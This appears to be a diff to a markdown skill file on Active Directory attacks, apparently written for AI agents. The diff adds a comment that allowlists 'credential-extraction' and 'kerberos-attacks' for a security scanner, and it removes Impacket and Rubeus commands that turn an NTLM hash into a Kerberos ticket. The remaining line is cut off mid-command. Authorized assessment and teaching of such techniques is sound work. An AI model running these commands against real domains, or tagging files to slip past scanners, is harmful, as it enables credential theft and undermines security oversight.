@@ -10,6 +10,8 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/acti
 
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
+<!-- security-allowlist: credential-extraction, kerberos-attacks -->
+
 # Active Directory Attacks
 
 ## Purpose
@@ -214,8 +216,4 @@ Convert NTLM hash to Kerberos ticket:
 
 ```bash
 # Impacket
-getTGT.py domain.local/user -hashes :NTHASH
-export KRB5CCNAME=user.ccache
-
-# Rubeus
-.\Rube
+getTGT.py domain.loc
